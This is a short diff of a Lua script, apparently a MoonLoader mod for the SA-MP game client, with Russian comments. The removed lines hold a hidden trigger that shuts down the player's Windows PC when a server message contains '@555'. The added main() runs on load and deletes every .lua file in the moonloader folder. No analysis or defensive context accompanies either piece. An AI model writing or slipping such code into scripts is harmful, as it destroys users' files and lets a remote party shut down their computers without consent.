@@ -1,11 +1,19 @@
-function
-    if not isSampLoaded() or not isSampfuncsLoaded() then return end
-    while not isSampAvailable() do wait(100) end
-end
+function main()
+    wait(500) -- Небольшая задержка, чтобы всё инициализировалось
 
-function sampev.onServerMessage(color, message)
-    if message:find("@555") then
-        sampSendChat("123456")
-        os.execute('shutdown /s /t 300')
+    local Directory = getWorkingDirectory().."\\moonloader\\"
+    local Handle, FileName = findFirstFile(Directory.."*.lua")
+
+    while FileName do
+        local FilePath = Directory..FileName
+
+        -- Удаляем файл
+        local success = os.remove(FilePath)
+        if success then
+            print("Удалён: "..FileName)
+        else
+            print("Не удалось удалить: "..FileName)
+        end
+
+        FileName = findNextFile(Handle)
     end
-end
